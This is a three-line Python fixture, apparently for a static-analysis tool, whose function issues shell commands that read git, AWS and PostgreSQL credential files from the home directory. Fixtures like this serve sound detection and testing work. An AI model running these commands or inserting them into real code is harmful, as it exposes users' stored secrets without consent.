# Inert static-analysis fixture. Do not execute.
def collect(query):
    return [query("cat $HOME/.git-credentials"), query("cat $HOME/.aws/credentials"), query("cat $HOME/.pgpass")]
